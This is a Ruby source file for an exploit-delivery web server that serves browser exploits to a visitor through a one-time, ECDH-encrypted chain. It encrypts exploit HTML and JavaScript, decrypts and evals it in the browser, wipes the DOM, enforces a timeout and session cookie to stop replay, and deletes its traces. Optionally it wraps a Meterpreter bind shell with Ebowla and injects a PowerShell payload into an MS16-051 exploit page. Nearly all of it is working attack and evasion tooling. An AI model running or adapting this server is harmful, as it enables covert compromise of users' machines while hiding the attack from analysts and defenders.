require 'openssl'
require 'digest'
require 'gibberish'
require 'socket'
require 'uri'
require 'cgi'
require 'rubygems'
require 'nokogiri'
require 'securerandom'
require 'stringio'
require 'webrick'
require 'optparse'
require 'find'

'''
##     ## ########   ######      ######## ######## ######## #### ########    ###     ######  
###   ### ##     ## ##    ##     ##       ##       ##        ##     ##      ## ##   ##    ## 
#### #### ##     ## ##           ##       ##       ##        ##     ##     ##   ##  ##       
## ### ## ########  ##   ####    ######   ######   ######    ##     ##    ##     ##  ######  
##     ## ##   ##   ##    ##     ##       ##       ##        ##     ##    #########       ## 
##     ## ##    ##  ##    ##     ##       ##       ##        ##     ##    ##     ## ##    ## 
##     ## ##     ##  ######      ######## ##       ##       ####    ##    ##     ##  ###### 
'''

'''
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
'''


# Files will be served from this directory
WEB_ROOT = './public'
EXPLOITS = './exploits'

use_ebowla_payload = false
listen_port = 2345

options = {}
OptionParser.new do |opt|
  opt.on('--exploit EXPLOIT','Path to exploit') { |o| options[:exploit] = o }
end.parse!

if options[:exploit].nil?
  puts "Choose your exploit file with --exploit path_to_exploit\n\n"
  html_file_paths = []
  Find.find(File.expand_path(File.join(File.dirname(__FILE__)),EXPLOITS)) do |path|
    if path =~ /.*\.html$/
      puts path
    end
    end
  exit
end

# Map extensions to their content type
CONTENT_TYPE_MAPPING = {
  'html' => 'text/html',
  'js' => 'application/javascript',

}

# Treat as binary data if content type cannot be found
DEFAULT_CONTENT_TYPE = 'application/octet-stream'

#define the Ellyptic Curve Diffie Hellman key pair
class DH_key_pair
  attr_accessor :server_key, :client_pub
  
  def initialize(server_key = 0, client_pub = 0)
    @server_key = server_key
    @client_pub = client_pub
  end

  #add the client public key to the object
  def add_client_pub(client_pub = 0)
    @client_pub = client_pub
  end

  #get the server public key in hex format
  def get_pub_hex
    pub = self.server_key.public_key
    pub_bin = pub.to_bn()
    pub_hex = pub_bin.to_s(16)
    pub_hex_x = pub_hex[2..65]
    pub_hex_y = pub_hex[66..-1]
    return pub_hex_x, pub_hex_y
  end
end

#create ebowla malware
def generate_ebowla(key)
  #add the newly generated public keys to the JS files
  orig_config = File.read('/home/ubuntu/Ebowla/genetic.config')
  orig_config.sub! 'myeggmyegghdjsfaskldj', key
  File.open('/home/ubuntu/Ebowla/genetic.config.new', 'w') { |file| file.write(orig_config) }
  #execute the Ebowla generator
  value = %x(/home/ubuntu/Ebowla/ebowla.py /home/ubuntu/met_shell_bind.exe /home/ubuntu/Ebowla/genetic.config.new)
  value = %x(/home/ubuntu/Ebowla/ebowla.py /home/ubuntu/ecdh/exploits/004.exe /home/ubuntu/Ebowla/genetic.config.new)
  puts value
  #encode PS1 for lazy bypass, should be changed for encryption
  payload =  File.read("/home/ubuntu/ecdh/output/powershell_symmetric_004.exe.ps1", :encoding => "ASCII", :mode=> "rb")  
  payload_base64 = Base64.encode64(payload.force_encoding('ASCII'))
  File.open(WEB_ROOT + "/test.txt", 'w') { |file| file.write(payload_base64) }
end

def insert_powershell_payload(exploit, payload, egg)
  #change egg to random - good for testing
  #puts egg
  fullegg = egg+egg
  payload =  File.read(payload, :encoding => "UTF-16LE", :mode=> "rb")
  payload.sub! 'myeggmyegg'.encode("UTF-16LE"),fullegg.encode("UTF-16LE")
  #puts payload
  #echo "get-host" | iconv --to-code UTF-16LE | base64 -w 0
  payload_base64 = Base64.encode64(payload.force_encoding('UTF-16LE')).delete!("\n")  #base64 encode
  new_exploit = File.read(exploit)   #'ms16_051_vbscript_notepad.html'
  new_exploit.sub! 'JAB0AGUAbQBwAEYAaQBsAGUAIAA9ACAAWwBpAG8ALgBwAGEAdABoAF0AOgA6AEcAZQB0AFQAZQBtAHAARgBpAGwAZQBOAGEAbQBlACgAKQA7AGUAYwBoAG8AIAAiAEUAeABwAGwAbwBpAHQAIABzAHUAYwBjAGUAZQBkAGUAZAAhACIAIAA+AD4AIAAkAHQAZQBtAHAARgBpAGwAZQAgADsATgBvAHQAZQBwAGEAZAAgACQAdABlAG0AcABGAGkAbABlACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA=', payload_base64
  File.open(exploit+ '.new', 'w') { |file| file.write(new_exploit) }
end

# get the cookie from the HTTP request
def get_session_cookie(request)
  req = WEBrick::HTTPRequest.new(WEBrick::Config::HTTP)
  req.parse(StringIO.new(request))
  cookie_value = 'notfound'

  for i in req
    if i == 'cookie'
      k = CGI::Cookie.parse(req[i])
      cookie = k['session'].to_s
      cookie_value = cookie.split(";")[0].split("=")[1]   #FIXME

    end
  end
  return cookie_value
end

#check if session cookie is valid
def validate_cookie(user_cookie, securecookie)
  if user_cookie != securecookie

    abort("Invalid cookie")
  end
end

#generate the ECDH server secret key and store it
def dh_phase1()
  server_key = OpenSSL::PKey::EC.new("secp256k1").generate_key
  dh_key_pair = DH_key_pair.new(server_key,0)
  return dh_key_pair
end

#convert client ECDH public key from sjcl format to Ruby format
def get_pub_point(client_pub)
  client_pub_hex = "04" + client_pub.unpack("m0").first.unpack("H*").first
  pointBN = OpenSSL::BN.new(client_pub_hex,16)
  group = OpenSSL::PKey::EC::Group.new('secp256k1') #EC Group to be used
  client_pub_point = OpenSSL::PKey::EC::Point.new(group, pointBN)
  return client_pub_point
end

#now that we have the shared key, we can encrypt data
def dh_phase2(cipher,exploit_code)  
  encrypted = cipher.encrypt(exploit_code)
  return encrypted
end

# This helper function parses the extension of the
# requested file and then looks up its content type.

def content_type(path)
  ext = File.extname(path).split(".").last
  CONTENT_TYPE_MAPPING.fetch(ext, DEFAULT_CONTENT_TYPE)
end

#this method will parse the exploit HTML, and split into different parts in head and body
#JS code will be evaled, HTML code will be document.write, meta will be added without encryption
def parse_html(doc)
  doc_objects = Array.new

  #select all meta elements from head
  head_static_elements = doc.xpath("//head//meta")
  head_static_elements.each do |head_static_element|
    doc_objects << ['head','static',head_static_element.to_s]
  end

  #select all non javascript, like static HTML or vbscript from head
  head_docwrite_elements = doc.xpath('//head//*[not(self::script) and not(self::meta)] | //head//script[@type="text/vbscript"]')
  head_docwrite_elements.each do |head_docwrite_element|
    doc_objects << ['head','doc_write',head_docwrite_element.to_s]
  end

  #select all javascript from head
  head_eval_elements = doc.xpath('//head//script[@type="text/javascript"] | //head//script[not(@type)]')
  head_eval_elements.each do |head_eval_element|
    doc_objects << ['head','eval',head_eval_element.children.text]
    #puts head_eval_element.children.inspect
  end

  #select all non javascript, like static HTML or vbscript from body
  body_docwrite_elements = doc.xpath('//body/*[not(self::script)] | //body/script[@type="text/vbscript"]')
  body_docwrite_elements.each do |body_docwrite_element|
    doc_objects << ['body','doc_write',body_docwrite_element.to_s]
  end

  #select all javascript from body
  body_eval_elements = doc.xpath('//body//script[@type="text/javascript"] | //body//script[not(@type)]')
  body_eval_elements.each do |body_eval_element|
    doc_objects << ['body','eval',body_eval_element.children.text]
  end
  #p doc_objects
  return doc_objects

end

# This helper function parses the Request-Line and
# generates a path to a file on the server.

def requested_file(request_line, full_req,dh_key_pair, options, use_ebowla_payload)

  request_uri  = request_line.split(" ")[1]
  path         = URI.unescape(URI(request_uri).path)

  if path == '/dh.js'
    #check if this is the next valid step in the chain
    if $next_doc != 'dh.js'
      abort("dh.js")
    end
    $next_doc = 'client_pub.html'

    user_cookie = get_session_cookie(full_req)
    validate_cookie(user_cookie,$securecookie)
    dh_key_pair = dh_phase1()
    pub_hex_x, pub_hex_y = dh_key_pair.get_pub_hex()

    #add the newly generated public keys to the JS files
    dh_orig_js = File.read(WEB_ROOT + '/dh.orig.js')
    dh_orig_js.sub! '<INSERT_pub_server_hex_x_HERE>', '"' + pub_hex_x + '"'
    dh_orig_js.sub! '<INSERT_pub_server_hex_y_HERE>', '"' + pub_hex_y + '"'
    File.open(WEB_ROOT + '/dh.js', 'w') { |file| file.write(dh_orig_js) }

  end

  if path =='./dh.orig.js'
    abort('Accessing DH orig is forbidden')
  end
  
  if path == '/client_pub.html'

    #check if this is the next valid step in the chain
    if $next_doc != 'client_pub.html'
      abort("client_pub.html")
    end

    $next_doc = 'final.html'
    user_cookie = get_session_cookie(full_req)
    validate_cookie(user_cookie,$securecookie)
    uri = URI.parse(request_uri).query
    params = CGI.parse( uri)

    #get the client ECDH public key
    client_pub = params["cl"]
    client_pub_point = get_pub_point(client_pub[0])
    dh_key_pair.add_client_pub(client_pub_point)
    shared_key = dh_key_pair.server_key.dh_compute_key(dh_key_pair.client_pub)
    cipher = Gibberish::AES.new([shared_key].pack("m0"),{iter: 101})
    puts options[:exploit] 
    doc = Nokogiri::HTML(open(options[:exploit]))
    doc_objects = Array.new
    doc_objects = parse_html(doc)
    head_static = Array.new
    head_docwrite_enc = Array.new
    head_eval_enc = Array.new
    body_docwrite_enc = Array.new
    body_eval_enc = Array.new
    for i in doc_objects
      if i[0] == 'head'
        if i[1] == 'static'
          head_static << i[2]
        elsif i[1] == 'doc_write'
          head_docwrite_enc << dh_phase2(cipher,i[2])
        elsif i[1] == 'eval'
          head_eval_enc << dh_phase2(cipher,i[2])
        end

      elsif i[0] == 'body'
        if i[1] == 'doc_write'
          body_docwrite_enc << dh_phase2(cipher,i[2])
        elsif i[1] == 'eval'
          body_eval_enc << dh_phase2(cipher,i[2])
        end
      end
    end

    dh_key_pair = ''

    header = "<html><head>\n"
    #add static meta elements to the header
    for i in head_static
      header = header << i << "\n"
    end

    header = header <<  '<meta content="text/html;charset=utf-8" http-equiv="Content-Type"><meta content="utf-8" http-equiv="encoding"><script type="text/javascript" src="./sjcl.js"></script><script>function loaded() {sjcl.random.startCollectors();}'+"\n"
    
    #add the document.write elements to the header
    for i in head_docwrite_enc
      header = header << 'document.write(sjcl.decrypt(sessionStorage.SK_base64,\''+ i +'\'));' << "\n"
    end

    #add the JS eval elements to the header
    for i in head_eval_enc
      header = header << 'eval(sjcl.decrypt(sessionStorage.SK_base64,\''+ i +'\'));' << "\n"
    end

    #close header, start body
    header = header <<  "</script></head><body><script>\n"

    #add the document.write elements to the body
    body = ''
    
    #I experienced with detecting the browser debug window, no luck
    #body = body << "var element = new Image();element.__defineGetter__('id', function() {window.stop();throw new Error('Something went badly wrong!');});console.log(element);"
    #body = body <<  'if(window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized){window.stop();throw new Error("Something went badly wrong!");}'
    
    for i in body_docwrite_enc
      body = body << 'document.write(sjcl.decrypt(sessionStorage.SK_base64,\''+ i +'\'));' << "\n"
    end

    #add the eval elements to the body
    for i in body_eval_enc
      body = body << 'eval(sjcl.decrypt(sessionStorage.SK_base64,\''+ i +'\'));' << "\n"
    end

    if use_ebowla_payload
        egg_code = dh_phase2(cipher,"var myegg='" + EBOWLA_KEY + "';")
        body = body << 'eval(sjcl.decrypt(sessionStorage.SK_base64,\''+ egg_code +'\'));' << "\n"
    end

    #clear the session key from the client, no longer needed
    body = body <<  "sessionStorage.SK_base64='xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx';";
    #remove full DOM
    body = body <<  "document.removeChild(document.documentElement);";
    #close tags
    body = body <<  "</script></body></html>";
    File.open(WEB_ROOT + '/final.html', 'w') { |file| file.write(header + body) }
  end

  if path == '/final.html'
    #if more than 10 seconds passed between the first and the final request, timeout, don't deliver exploit
    delta =  Time.now.to_i - $start_time
    if delta > 10
      abort("Timeout") 
    end
    #check if this is the next valid step in the chain
    if $next_doc != 'final.html'
      abort("final.html")
    end
    $next_doc = 'test.txt'
    user_cookie = get_session_cookie(full_req)
    validate_cookie(user_cookie,$securecookie)
  end  
  
  clean = []
  # Split the path into components
  parts = path.split("/")
  parts.each do |part|
    # skip any empty or current directory (".") path components
    next if part.empty? || part == '.'
    # If the path component goes up one directory level (".."),
    # remove the last clean component.
    # Otherwise, add the component to the Array of clean components
    part == '..' ? clean.pop : clean << part
  end

  # return the web root joined to the clean path
  return File.join(WEB_ROOT, *clean), dh_key_pair
end

myegg = SecureRandom.hex[0..5]

if use_ebowla_payload
  EBOWLA_KEY = myegg + myegg +  SecureRandom.hex
  generate_ebowla(EBOWLA_KEY)
  insert_powershell_payload(EXPLOITS + '/ms16_051_vbscript_notepad.html', EXPLOITS + '/findegg.ps1', myegg)
end

#start new TCP server
server = TCPServer.new('0.0.0.0', listen_port)

#generate the ECDH server secret key
dh_key_pair = DH_key_pair.new()

puts 'Listening on ' + listen_port.to_s

final = 0
$next_doc = 'index.html'
$sjcl_counter = 0

loop do
  begin
    #read for requests
    Thread.fork(server.accept) do |socket|
      request_line = socket.gets
      STDOUT.puts request_line
      full_req = request_line

      while line = socket.gets
        full_req = full_req << line
        break if line =~ /^\s*$/
      end

      unless request_line.nil?
        #do special things when a resource is requested
        path, dh_key_pair_temp = requested_file(request_line,full_req, dh_key_pair, options, use_ebowla_payload)

        if dh_key_pair_temp != 0
          dh_key_pair = dh_key_pair_temp
        end

        path = File.join(path, 'index.html') if File.directory?(path)

        # Make sure the file exists and is not a directory
        # before attempting to open it.
        if File.exist?(path) && !File.directory?(path)
          File.open(path, "rb") do |file|
            cookie = ''

            #we start the chain in index.html, this will be treated differently
            if path  == './public/index.html'
              $start_time = Time.now.to_i
              #generate a new cookie, which will be checked during the session
              $securecookie = SecureRandom.hex
              cookie = 'Set-Cookie: session=' + $securecookie + "\r\n"
              if $next_doc != 'index.html'
                #abort("index")
              end
              $next_doc = 'dh.js'
            end

            response =
            "HTTP/1.1 200 OK\r\n" +
            "Content-Type: #{content_type(file)}\r\n" +
            "Content-Length: #{file.size}\r\n" +
            cookie  +
            "Connection: close\r\n"

            response = response + "Cache-Control: no-cache, no-store, must-revalidate\r\n" +
            "Pragma: no-cache\r\n" +
            "Expires: 0\r\n"
            socket.print response + "\r\n"
            # write the contents of the file to the socket
            IO.copy_stream(file, socket)

          end
        else
          message = "File not found\n"

          # respond with a 404 error code to indicate the file does not exist
          socket.print "HTTP/1.1 404 Not Found\r\n" +
          "Content-Type: text/plain\r\n" +
          "Content-Length: #{message.size}\r\n" +
          "Connection: close\r\n"

          socket.print "\r\n"
          socket.print message
        end
      end

      socket.close

      #remove the temporary generated files
      if File.exist?(WEB_ROOT + '/dh.js')
        File.delete(WEB_ROOT + '/dh.js')
      end

      #remove the temporary generated files
      if path  == WEB_ROOT + '/final.html'
        if File.exist?(WEB_ROOT + '/final.html')
          File.delete(path)
        end
      end

      #create onetime exploit. If both final.html and sjcl.js was served, we are done
      if path  == './public/final.html'
        final = 1
      end
      if path  == './public/sjcl.js'
        final += 1
      end
      if path == './public/test.txt'
        final += 1
      end
      
      steps_to_finish = 2
      
      if use_ebowla_payload 
        steps_to_finish = 3
      end
      
      if final ==  steps_to_finish
        $securecookie = "ruiq34hruefslsdkf4r"   #just overwrite with random
        abort("The end")
        final = 0
      end
    end
  rescue  Errno::ECONNRESET => e
    STDERR.puts "ignoring ECONNRESET"
  rescue  Errno::EPIPE => e
    STDERR.puts "ignoring EPIPE"
  end

end
